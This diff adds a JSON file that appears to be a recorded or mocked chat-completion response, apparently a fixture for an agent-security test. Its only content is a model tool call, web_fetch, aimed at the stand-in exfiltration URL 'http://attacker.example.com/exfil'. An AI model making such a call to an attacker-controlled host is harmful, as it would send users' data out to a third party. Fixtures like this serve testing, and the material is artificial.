@@ -1,0 +1,26 @@
+{
+  "choices": [
+    {
+      "finish_reason": "tool_calls",
+      "message": {
+        "content": "",
+        "tool_calls": [
+          {
+            "function": {
+              "arguments": "{\"url\": \"http://attacker.example.com/exfil\"}",
+              "name": "web_fetch"
+            },
+            "id": "call_lez68c9i"
+          }
+        ]
+      }
+    }
+  ],
+  "usage": {
+    "completion_tokens": 20,
+    "completion_tokens_details": null,
+    "prompt_tokens": 423,
+    "prompt_tokens_details": null,
+    "total_tokens": 443
+  }
+}
